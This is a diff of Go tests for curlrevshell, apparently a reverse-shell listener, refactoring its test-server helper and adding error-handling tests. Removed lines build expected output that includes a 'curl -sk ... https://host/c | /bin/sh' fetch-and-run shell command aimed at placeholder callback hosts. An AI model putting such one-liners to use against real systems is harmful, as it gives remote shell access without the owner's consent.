@@ -5,13 +5,13 @@ package hsrv
  * Tests for hserv.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20260304
+ * Last Modified 20260801
  */
 
 import (
+	"cmp"
 	"context"
 	"crypto/tls"
-	"encoding/json"
 	"errors"
 	"fmt"
 	"io"
@@ -23,79 +23,94 @@ import (
 	"slices"
 	"strconv"
 	"strings"
-	"sync"
 	"testing"
 	"time"
 
 	"github.com/magisterquis/curlrevshell/internal/iobroker"
-	"github.com/magisterquis/curlrevshell/lib/chanlog"
+	"github.com/magisterquis/curlrevshell/internal/tlog"
+	"github.com/magisterquis/curlrevshell/lib/crsdialer"
 	"github.com/magisterquis/curlrevshell/lib/crstemplate"
 	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 	"github.com/magisterquis/curlrevshell/lib/sstls"
 )
 
-var (
-	// errTestEnding indicates we're cancelling a context because the test
-	// is over.
-	errTestEnding = errors.New("test ending")
-)
+// bufLen is used for the buffer length of our iobroker channels.
+var bufLen = 512
 
-// newTestServer is newTestServerMaybeWithDir without a static files directory.
-func newTestServer(t *testing.T) (
-	chanlog.ChanLog, /* Server logs. */
-	chan<- string, /* From shell */
-	<-chan opshell.CLine,
-	*Server,
-	func(),
-) {
-	return newTestServerMaybeWithDir(t, false)
+// testServerConfig configures newTestServer.
+type testServerConfig struct {
+	debug      bool   /* Log/Print debug messages. */
+	makeFDir   bool   /* Make directory from which to serve files. */
+	noLogHI    bool   /* Don't log HTTP info. */
+	oneShell   bool   /* Exit after one shell. */
+	wantErr    error  /* Error we expect. */
+	listenAddr string /* Listen address. */
+	tmplf      string /* Template file. */
+	registerHM bool   /* Register help messages. */
+	urlPaths   *crstemplate.URLPaths
 }
 
-// newTestServerMaybeWithDir returns a new server, suitable for testing.
-// The returned function may be called to shut down the server, which will
-// closs the chanLog and CLine channels.  It need not be explicitly called.
-// By default, no static files directory will be made.  Set makeFDir to true
-// to create one.
-func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
-	chanlog.ChanLog, /* Server logs. */
-	chan<- string, /* From shell */
-	<-chan opshell.CLine,
-	*Server,
-	func(),
+// newTestServer returns a new server, suitable for testing, as well as a
+// client configured for the server's TLS.
+// A nil config is equivalent to an empty config.
+//
+// Run like
+//
+//	tb, ich, och, done, c, s := newTestServer(t.Context(), t, nil)
+func newTestServer(ctx context.Context, t *testing.T, conf *testServerConfig) (
+	*tlog.Buffer, /* tb */
+	chan<- string, /* ich */
+	<-chan opshell.CLine, /* och */
+	<-chan struct{}, /* done. */
+	*http.Client, /* c */
+	*Server, /* s */
 ) {
+	t.Helper()
 	var (
-		cl, sl = chanlog.New()
-		ich    = make(chan string, 1024)
-		och    = make(chan opshell.CLine, 1024)
+		addr    = "127.0.0.1"
+		cbAddrs = []string{"kittens.com:8888", "moose.com"}
+		done    = make(chan struct{})
+		ich     = make(chan string, bufLen)
+		och     = make(chan opshell.CLine, bufLen)
+		tb, sl  = tlog.NewBuffer()
+		td      string
+
+		iob = iobroker.New(och)
 	)
-	var td string
-	if makeFDir {
+
+	/* Need a config. */
+	if nil == conf {
+		conf = new(testServerConfig)
+	}
+	/* Work out if we're serving files. */
+	if conf.makeFDir {
 		td = t.TempDir()
 	}
-	iob, err := iobroker.New(ich, och)
-	if nil != err {
-		t.Fatalf("Error setting up IO Broker: %s", err)
+	/* Work out our parameters. */
+	params := crstemplate.Params{StaticFilesDir: td}
+	if nil != conf.urlPaths {
+		params.URLPaths = *conf.urlPaths
 	}
-	cbAddrs := []string{"kittens.com:8888", "moose.com"}
+	/* Set up a new server. */
 	s, err := New(
 		sl,
-		"127.0.0.1:0",
-		"",
-		ich,
-		och,
+		cmp.Or(conf.listenAddr, addr),
+		conf.tmplf,
 		iob,
-		"",
+		"", /* certFile */
 		cbAddrs,
-		true,
-		false,
-		true, /* printDebug */
-		crstemplate.Params{
-			StaticFilesDir: td,
-		},
+		false, /* printIPv6 */
+		conf.debug,
+		params,
 	)
 	if nil != err {
-		t.Fatalf("Creating server: %s", err)
+		t.Fatalf("Error creating server: %s", err)
+	}
+
+	/* Register help functions, maybe. */
+	if conf.registerHM {
+		s.RegisterOneLiners()
 	}
 
 	/* Make sure none of the URLPaths are empty. */
@@ -110,173 +125,73 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 		}
 	}
 
+	/* Work out the context, including optional test things. */
+	ctx, cancel := context.WithCancel(ctx)
+	if conf.noLogHI {
+		ctx = context.WithValue(ctx, testNoLogHIKey{}, true)
+	}
+
 	/* Start the server going. */
-	ctx, cancel := context.WithCancelCause(context.Background())
-	eg, ectx := ctxerrgroup.WithContext(ctx)
-	eg.GoTag(ectx, "Server", s.Do)
-	eg.GoTag(ectx, "i/o broker", iob.Do)
-
-	/* Function to shut down the server. */
-	shutdown := sync.OnceFunc(func() {
-		/* Tell everything to stop. */
-		cancel(errTestEnding)
-		err := eg.Wait()
-		if nil != err &&
-			!errors.Is(err, ErrOneShellClosed) &&
-			!errors.Is(err, net.ErrClosed) { //&&
-			//	!errors.Is(err, context.Canceled) {
-			t.Fatalf("Unexpected server error: %s", err)
-		}
-		close(cl)
-		close(och)
+	eg, ctx := ctxerrgroup.WithContext(ctx)
+	eg.GoTag(ctx, "Server", func(ctx context.Context) error {
+		defer close(done)
+		return s.Do(ctx)
 	})
-	t.Cleanup(shutdown)
-
-	/* Work out our listen port. */
-	_, listenPort, err := net.SplitHostPort(s.l.Addr().String())
-	if nil != err {
-		t.Fatalf(
-			"Error splitting listen address %s into "+
-				"host and port: %s",
-			s.l.Addr().String(),
-			err,
-		)
-	}
-
-	/* Make sure we get a listening on message. */
-	type wantCLine struct {
-		prep func(s string) string
-		want opshell.CLine
-	}
-	listeningWCLs := []wantCLine{{
-		want: opshell.CLine{
-			Line: fmt.Sprintf("Listening on %s", s.l.Addr()),
-		},
-	}}
-	fileWCLs := []wantCLine{{
-		want: opshell.CLine{
-			Color: ScriptColor,
-			Line:  "To get files from " + td + ":",
-		},
-	}, {
-		want: opshell.CLine{
-			Color:       ScriptColor,
-			Line:        "\n",
-			NoTimestamp: true,
-		},
-	}}
-
-	for _, addr := range []string{
-		cbAddrs[0],
-		net.JoinHostPort(
-			cbAddrs[1],
-			listenPort,
-		),
-		s.l.Addr().String(),
-	} {
-		fileWCLs = append(fileWCLs, wantCLine{want: opshell.CLine{
-			Color: ScriptColor,
-			Line: fmt.Sprintf(
-				"curl -sk "+
-					"--pinnedpubkey sha256//%s "+
-					"https://%s",
-				s.l.Fingerprint,
-				addr,
-			),
-			NoTimestamp: true,
-		}})
-	}
-	fileWCLs = append(fileWCLs, wantCLine{want: opshell.CLine{
-		Color:       ScriptColor,
-		Line:        "\n",
-		NoTimestamp: true,
-	}})
-	shellWCLs := []wantCLine{{
-		want: opshell.CLine{
-			Color: ScriptColor,
-			Line:  "To get a shell:",
-		},
-	}, {
-		want: opshell.CLine{
-			Color:       ScriptColor,
-			Line:        "\n",
-			NoTimestamp: true,
-		},
-	}}
-	for _, addr := range []string{
-		cbAddrs[0],
-		net.JoinHostPort(
-			cbAddrs[1],
-			listenPort,
-		),
-		s.l.Addr().String(),
-	} {
-		shellWCLs = append(shellWCLs, wantCLine{want: opshell.CLine{
-			Color: ScriptColor,
-			Line: fmt.Sprintf(
-				"curl -sk "+
-					"--pinnedpubkey sha256//%s "+
-					"https://%s/c | /bin/sh",
-				s.l.Fingerprint,
-				addr,
-			),
-			NoTimestamp: true,
-		}})
-	}
-	shellWCLs = append(shellWCLs, wantCLine{want: opshell.CLine{
-		Color:       ScriptColor,
-		Line:        "\n",
-		NoTimestamp: true,
-	}})
-	wantCLines := make(
-		[]wantCLine,
-		0,
-		len(listeningWCLs)+len(fileWCLs)+len(shellWCLs),
-	)
-	wantCLines = append(wantCLines, listeningWCLs...)
-	if makeFDir {
-		wantCLines = append(wantCLines, fileWCLs...)
-	}
-	wantCLines = append(wantCLines, shellWCLs...)
-	for i, want := range wantCLines {
-		got := <-och
-		if nil != want.prep {
-			got.Line = want.prep(got.Line)
-		}
-		if got != want.want {
+	eg.GoTag(ctx, "i/o broker", func(ctx context.Context) error {
+		return iob.Run(ctx, ich, conf.oneShell)
+	})
+	t.Cleanup(func() {
+		t.Helper()
+		cancel()
+		/* Everything should end happily. */
+		if got, want := eg.Wait(), conf.wantErr; !errors.Is(got, want) {
 			t.Errorf(
-				"Incorrect shell message:\n"+
-					"   i: %d\n"+
-					" got: %#v\n"+
-					"want: %#v",
-				i,
+				"Unexpected error after server shutdown\n"+
+					"got: %v\n"+
+					"want: %v",
 				got,
-				want.want,
+				want,
 			)
 		}
-	}
+		/* Make sure we have no leftover opshell or log lines. */
+		close(och)
+		opshell.ExpectNoShellMessages(t, och)
+		tb.CloseExpectEmpty(context.Background(), t)
+	})
 
-	/* Make sure we get exactly the logs we expect. */
-	cl.ExpectEmpty(t,
-		`{"time":"","level":"INFO","msg":"Listener started",`+
-			`"address":"`+s.l.Addr().String()+`",`+
-			`"fingerprint":"`+s.l.Fingerprint+`"}`,
+	/* Server started? */
+	opshell.ExpectShellMessages(t, och, opshell.CLine{
+		Line: fmt.Sprintf("Listening on %s", s.l.Addr()),
+	})
+	tb.Expect(t.Context(), t,
+		tlog.M.
+			With(LKFingerprint, s.l.Fingerprint).
+			With(LKListenAddr, s.l.Addr().String()).
+			Info(LMListenerStarted),
 	)
+
+	/* And a client pre-configured for the server's TLS fingerprint. */
+	fpv, err := crsdialer.TLSFingerprintVerifier(s.l.Fingerprint)
+	if nil != err {
+		t.Fatalf("Error setting up client TLS verification: %v", err)
+	}
+	tr := http.DefaultTransport.(*http.Transport).Clone()
+	tr.TLSClientConfig = &tls.Config{
+		InsecureSkipVerify: true,
+		VerifyConnection:   fpv,
+	}
+	c := &http.Client{Transport: tr}
 
 	/* Don't keep going if we have an error. */
 	if t.Failed() {
 		t.FailNow()
 	}
 
-	return cl, ich, och, s, shutdown
+	return tb, ich, och, done, c, s
 }
 
 func TestServer_Smoketest(t *testing.T) {
-	newTestServer(t)
-}
-
-func TestServer_SmoketestWithDir(t *testing.T) {
-	newTestServerMaybeWithDir(t, true)
+	newTestServer(t.Context(), t, nil)
 }
 
 func TestSortAddresses(t *testing.T) {
@@ -345,255 +260,151 @@ func TestSortAddresses(t *testing.T) {
 	}
 }
 
+// Make sure the returned client can connect to the server.
+func TestServer_Client(t *testing.T) {
+	_, _, _, _, c, s := newTestServer(t.Context(), t, nil)
+	res, err := c.Get("https://" + s.l.Addr().String())
+	if nil != err {
+		t.Fatalf("GET error: %v", err)
+	}
+	defer res.Body.Close()
+	if http.StatusNotFound != res.StatusCode {
+		t.Errorf("Unexpected HTTP status: %s", res.Status)
+	}
+}
+
 // Make sure the server returns after a single shell, if oneShell is set.
 func TestServer_OneShell(t *testing.T) {
-	cl, _, _, s, shutdown := newTestServer(t)
-	s.oneShell = true /* Only handle one shell. */
-
-	/* HTTP Client which does not certificate validation. */
-	httpc := http.Client{
-		Transport: &http.Transport{TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-		}},
-	}
-
-	/* Connect a shell. */
 	var (
-		id     = "kittens"
-		doneCh = make(chan struct{})
-		ech    = make(chan error, 2)
-	)
-	go func() {
-		res, err := httpc.Get(
-			"https://" + s.l.Addr().String() + "/i/" + id,
+		eg, ctx                = ctxerrgroup.WithContext(t.Context())
+		id                     = tlog.S("id")
+		msg                    = tlog.S("output")
+		pr, pw                 = io.Pipe()
+		tb, _, och, done, c, s = newTestServer(
+			t.Context(),
+			t,
+			&testServerConfig{
+				noLogHI:  true,
+				oneShell: true,
+				wantErr:  iobroker.ErrOneShell,
+			},
 		)
-		if nil != err {
-			ech <- fmt.Errorf("request for /i: %w", err)
-			return
-		}
-		defer res.Body.Close()
-		if http.StatusOK != res.StatusCode {
-			ech <- fmt.Errorf(
-				"request for /i: status %s",
-				res.Status,
-			)
-		}
-		ech <- nil
-	}()
-	go func() {
-		pr, pw := io.Pipe()
+	)
+	defer pr.Close()
+	defer pw.Close()
+
+	/* Connection to the shell. */
+	eg.GoTag(ctx, "connection", func(ctx context.Context) error {
 		defer pr.Close()
-		defer pw.Close()
-		go func() {
-			<-doneCh
-			pw.Close()
-		}()
-		res, err := httpc.Post(
+		/* Connect to the server. */
+		res, err := c.Post(
 			"https://"+s.l.Addr().String()+"/o/"+id,
 			"",
 			pr,
 		)
 		if nil != err {
-			ech <- fmt.Errorf("request for /o: %w", err)
-			return
+			return fmt.Errorf("POST request: %w", err)
 		}
 		defer res.Body.Close()
 		if http.StatusOK != res.StatusCode {
-			ech <- fmt.Errorf(
-				"request for /o: status %s",
-				res.Status,
-			)
+			return fmt.Errorf("non-OK status: %s", res.Status)
 		}
-		<-doneCh
-		ech <- nil
-	}()
-
-	/* A different cl.Expect to account for port numbers. */
-	type lmsg struct {
-		Msg       string
-		Direction string
-	}
-	expectLogMessages := func(want map[lmsg]int) {
-		got := make(map[lmsg]int)
-		for i := 0; i < len(want); i++ {
-			select {
-			case l := <-cl:
-				var msg lmsg
-				if err := json.Unmarshal(
-					[]byte(l),
-					&msg,
-				); nil != err {
-					t.Fatalf(
-						"Error unmarshaling %s: %s",
-						l,
-						err,
-					)
-				}
-				/* Direction doesn't matter when we close the
-				listener. */
-				if LMOneShellClosingListener == msg.Msg {
-					msg.Direction = ""
-				}
-				got[msg]++
-			case err := <-ech:
-				t.Fatalf("Request error: %s", err)
-			}
-		}
-		if !maps.Equal(got, want) {
-			t.Fatalf(
-				"Incorrect logs:\ngot: %v\nwant: %v",
-				got,
-				want,
-			)
-		}
-	}
-
-	/* Wait for connections to happen and the listener to close. */
-	expectLogMessages(map[lmsg]int{
-		{Msg: LMOneShellClosingListener}:                     1,
-		{Msg: iobroker.LMNewConnection, Direction: "input"}:  1,
-		{Msg: iobroker.LMNewConnection, Direction: "output"}: 1,
+		/* Work out what our logs should have in them. */
+		return nil
 	})
 
-	/* Close the shell and make sure we're told about the disconnect. */
-	close(doneCh)
-	shutdown()
-	for i := 0; i < cap(ech); i++ {
-		if err := <-ech; nil != err {
-			t.Errorf(
-				"Request error after listener closed: %s",
-				err,
-			)
-		}
-	}
-	expectLogMessages(map[lmsg]int{
-		{Msg: iobroker.LMDisconnected, Direction: "input"}:  1,
-		{Msg: iobroker.LMDisconnected, Direction: "output"}: 1,
+	/* Send it some output. */
+	eg.GoTag(ctx, "output", func(ctx context.Context) error {
+		defer pw.Close()
+		_, err := pw.Write([]byte(msg))
+		return err
 	})
-	cl.ExpectEmpty(t)
+
+	/* Did it work? */
+	if err := eg.Wait(); nil != err {
+		t.Errorf("Error: %v", err)
+	}
+
+	/* Shell messages look ok? */
+	opshell.ExpectShellMessages(t, och,
+		opshell.CLine{
+			Color: connectedColor,
+			Line: fmt.Sprintf(
+				"[127.0.0.1] Output connected: ID %s",
+				id,
+			),
+		},
+		opshell.CLine{
+			Line:  msg,
+			Plain: true,
+		},
+		opshell.CLine{
+			Color: errorColor,
+			Line:  "[127.0.0.1] Output connection closed",
+		},
+	)
+	m := tlog.M.
+		With(iobroker.LKDirection, iobroker.LVOutput).
+		With(iobroker.LKID, id)
+	tb.Expect(t.Context(), t,
+		m.
+			Info(iobroker.LMNewConnection),
+		m.
+			With(iobroker.LKData, msg).
+			Info(iobroker.LMShellIO),
+		m.
+			Info(iobroker.LMConnectionClosed),
+	)
+
+	/* Server actually done? */
+	<-done
 }
 
 // Can we switch on and off debug messages?
-func TestServer_NoDebug(t *testing.T) {
-	/* bannerServer starts a server going, banners it, and returns its
-	output channel as well the address from which it was bannered.  The
-	server will be closed when the test finishes. */
-	bannerServer := func(
-		t *testing.T,
-		printDebug bool,
-	) (<-chan opshell.CLine, string) {
-		/* Assemble bits. */
-		var (
-			ich = make(chan string, 1024)
-			och = make(chan opshell.CLine, 1024)
+func TestServer_Debug(t *testing.T) {
+	/* try spawns a server, banner-grabs it, and checks for expected
+	messages. */
+	try := func(t *testing.T, printDebug bool) {
+		_, _, och, _, _, s := newTestServer(
+			t.Context(),
+			t,
+			&testServerConfig{debug: printDebug},
 		)
-		iob, err := iobroker.New(ich, och)
-		if nil != err {
-			t.Fatalf("Error setting up IO Broker: %s", err)
-		}
-
-		/* Roll a server. */
-		svr, err := New(
-			slog.New(slog.DiscardHandler),
-			"127.0.0.1:0",
-			"",
-			ich,
-			och,
-			iob,
-			"",
-			nil,
-			false,
-			false,
-			printDebug,
-			crstemplate.Params{},
-		)
-		if nil != err {
-			t.Fatalf(
-				"Error making server with printDebug:%t: %s",
-				printDebug,
-				err,
-			)
-		}
-
-		/* Start it going and make sure it ends eventually. */
-		var (
-			ctx, cancel = context.WithCancel(t.Context())
-			ech         = make(chan error, 1)
-			wg          sync.WaitGroup
-		)
-		wg.Add(1)
-		t.Cleanup(func() {
-			cancel()
-			if err := <-ech; nil != err {
-				t.Errorf("Server exited with error: %s", err)
-			}
-			close(ich)
-			close(och)
-			for l := range och {
-				t.Errorf("Leftover output line: %#v", l)
-			}
-		})
-		go func() { defer wg.Done(); ech <- svr.Do(ctx) }()
-
-		/* Remove normal startup things from the output channel.  These
-		have been checked elsewhere. */
-		for range 5 {
-			<-och
-		}
 
 		/* Banner-grab it. */
-		sa := svr.l.Addr().String()
-		c, err := net.DialTimeout("tcp", sa, time.Second)
+		c, err := net.DialTimeout(
+			"tcp",
+			s.l.Addr().String(),
+			time.Second,
+		)
 		if nil != err {
-			t.Fatalf(
-				"Error connecting to server at %s: %s",
-				sa,
-				err,
-			)
+			t.Fatalf("Error connecting to server: %v", err)
 		}
-		ba := c.LocalAddr().String()
 		if err := c.Close(); nil != err {
-			t.Fatalf("Error closing connection to server: %s", err)
+			t.Fatalf("Error closing connection to server: %v", err)
 		}
 
-		return och, ba
+		/* Did we get a debug message if we should have? */
+		if printDebug {
+			opshell.ExpectShellMessages(t, och, opshell.CLine{
+				Color: opshell.ColorMagenta,
+				Line: fmt.Sprintf(
+					"Server error: http: "+
+						"TLS handshake error from %s: "+
+						"%s\n",
+					c.LocalAddr(),
+					io.EOF,
+				),
+			})
+		}
+
 	}
 
-	/* Server which should get debug output. */
-	t.Run("with_debug", func(t *testing.T) {
-		/* See if we got an EOF. */
-		och, addr := bannerServer(t, true)
-		gotL, ok := <-och
-		if !ok {
-			t.Fatalf("Did not get output line")
-		}
-		if got, want := gotL.Color, ErrorColor; got != want {
-			t.Errorf(
-				"Incorrect output line color\n"+
-					" got: %s\n"+
-					"want: %s",
-				got,
-				want,
-			)
-		}
-		if got, want := gotL.Line, fmt.Sprintf(
-			"Server error: http: "+
-				"TLS handshake error from %s: EOF\n",
-			addr,
-		); got != want {
-			t.Errorf(
-				"Incorrect banner message\n"+
-					" got: %q\n"+
-					"want: %q",
-				got,
-				want,
-			)
-		}
-	})
+	/* Try with debug messages. */
+	t.Run("with_debug", func(t *testing.T) { try(t, true) })
 
-	/* Without debug output, shouldn't be anything to check.  The lack of
-	output will be checked by bannerServer. */
-	t.Run("no_debug", func(t *testing.T) { bannerServer(t, false) })
+	/* And try without debug messages. */
+	t.Run("no_debug", func(t *testing.T) { try(t, false) })
 }
 
 // Make sure we set ourselves up to debug-log paths correctly.
@@ -629,7 +440,7 @@ func TestSlogAttrsFromURLPaths(t *testing.T) {
 	}
 }
 
-// Make sure Server.listenAddresses adds port number to everything.
+// Make sure Server.allCallbackAddresses adds port number to everything.
 func TestServerListenAddresses_AddPorts(t *testing.T) {
 	/* Listener, for default port. */
 	l, err := sstls.Listen("tcp", "127.0.0.1:0", "", 0, "")
@@ -670,7 +481,7 @@ func TestServerListenAddresses_AddPorts(t *testing.T) {
 	}
 
 	/* Make sure we get what we expect. */
-	gotAddrs, err := (&Server{l: l}).listenAddresses(have)
+	gotAddrs, err := (&Server{l: l}).allCallbackAddresses(have)
 	if nil != err {
 		t.Fatalf("Error getting listen addresses: %s", err)
 	}
@@ -683,4 +494,149 @@ func TestServerListenAddresses_AddPorts(t *testing.T) {
 	for _, v := range slices.Sorted(maps.Keys(want)) {
 		t.Errorf("Did not get listen address %s", v)
 	}
+}
+
+// Do we handle failures to listen nicely?
+func TestNew_ListenError(t *testing.T) {
+	var (
+		addr    = tlog.S("({impossibleAddr!})")
+		lb, sl  = tlog.NewBuffer()
+		wantErr = "no such host"
+	)
+	_, err := New(
+		sl,
+		addr,
+		"",
+		nil,
+		"",
+		nil,
+		false,
+		true, /* Shouldn't matter. */
+		crstemplate.Params{},
+	)
+
+	/* Error look ok? */
+	de, ok := errors.AsType[*net.DNSError](err)
+	if !ok {
+		t.Fatalf(
+			"Error has incorrect type\n"+
+				" err: %v\n"+
+				" got: %T\n"+
+				"want: %T",
+			err,
+			err,
+			de,
+		)
+	}
+	if got, want := de.Err, wantErr; got != want {
+		t.Errorf(
+			"Incorrect error string\n got: %s\nwant: %s",
+			got,
+			want,
+		)
+	}
+	if !de.IsNotFound {
+		t.Errorf("Error not an NXDOMAIN: %v", err)
+	}
+
+	/* Should get no logs. */
+	lb.CloseExpectEmpty(t.Context(), t)
+}
+
+// Do we handle wonky callback addresses?
+func TestNew_AllCallbackAddressesError(t *testing.T) {
+	var (
+		_, sl = tlog.NewBuffer()
+		och   = make(chan opshell.CLine, bufLen)
+		iob   = iobroker.New(och)
+	)
+
+	_, err := New(
+		sl,
+		"",
+		"",
+		iob,
+		"",
+		[]string{testErrorCBAddr},
+		false,
+		true, /* Shouldn't matter. */
+		crstemplate.Params{},
+	)
+	if got, want := err, errAllCallbackAddresses; !errors.Is(got, want) {
+		t.Errorf("Incorrect error\n got: %v\nwant: %v", got, want)
+	}
+}
+
+// Do we handle no callback addresses?
+func TestNew_AllCallbackAddressesEmpty(t *testing.T) {
+	var (
+		_, sl = tlog.NewBuffer()
+		och   = make(chan opshell.CLine, bufLen)
+		iob   = iobroker.New(och)
+	)
+	_, err := New(
+		sl,
+		"",
+		"",
+		iob,
+		"",
+		[]string{testEmptyCBAddr},
+		false,
+		true, /* Shouldn't matter. */
+		crstemplate.Params{},
+	)
+	if got, want := err, errNoCallbackAddresses; !errors.Is(got, want) {
+		t.Errorf("Incorrect error\n got: %v\nwant: %v", got, want)
+	}
+}
+
+// Do we log different URL Paths properly?
+func TestNew_NonDefaultURLPaths(t *testing.T) {
+	var (
+		in     = tlog.S("in")
+		out    = tlog.S("out")
+		inout  = tlog.S("inout")
+		script = tlog.S("script")
+	)
+
+	/* Non-default paths. */
+	tb, _, _, _, _, _ := newTestServer(t.Context(), t, &testServerConfig{
+		urlPaths: &crstemplate.URLPaths{
+			In:     in,
+			InOut:  inout,
+			Out:    out,
+			Script: script,
+		},
+	})
+
+	/* Log properly? */
+	tb.Expect(t.Context(), t,
+		tlog.M.
+			With("In", in).
+			With("Out", out).
+			With("InOut", inout).
+			With("Script", script).
+			Info(LMURLPaths),
+	)
+}
+
+// Do we get an error if the HTTP server returns an error?
+func TestServerDo_ServeError(t *testing.T) {
+	_, _, _, done, c, s := newTestServer(t.Context(), t, &testServerConfig{
+		wantErr: net.ErrClosed,
+	})
+
+	/* Request, to make sure we're live. */
+	res, err := c.Get("https://" + s.l.Addr().String())
+	if nil != err {
+		t.Errorf("Get returned error: %v", err)
+	}
+	res.Body.Close()
+
+	/* That's a nice listener you have there; would be a shame if something
+	were to happen to it. */
+	if err := s.l.Close(); nil != err {
+		t.Errorf("Error closing listener: %v", err)
+	}
+	<-done
 }
